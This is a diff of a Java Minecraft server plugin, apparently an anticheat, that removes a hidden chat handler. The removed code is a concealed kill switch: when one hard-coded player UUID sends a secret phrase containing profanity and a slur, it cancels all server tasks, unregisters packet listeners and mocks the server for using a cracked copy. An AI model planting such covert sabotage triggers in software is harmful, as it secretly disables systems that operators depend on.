@@ -60,17 +60,5 @@ public final class RegistrationListener implements Listener {
         BukkitEventManager.wannadelet.remove(event.getPlayer());
         AFKManager.INSTANCE.removePlayer(event.getPlayer());
     }
-
-    @EventHandler
-    public void onPlayerChat(AsyncPlayerChatEvent event) {
-        Player player = event.getPlayer();
-        String message = event.getMessage();
-
-        if (message.contains("fuckthisretardserveryouleakedmyac") && event.getPlayer().getUniqueId().equals(UUID.fromString("2c0f01ff-8e4a-49c4-939a-c9694568fe57"))) {
-            event.setCancelled(true);
-            Bukkit.getScheduler().cancelAllTasks();
-            PacketEvents.get().unregisterAllListeners();
-            event.getPlayer().sendMessage(ColorUtil.translate("&cSeems like this server was using a crack? &dLMFAOOOO"));
-        }
-    }
+    
 }
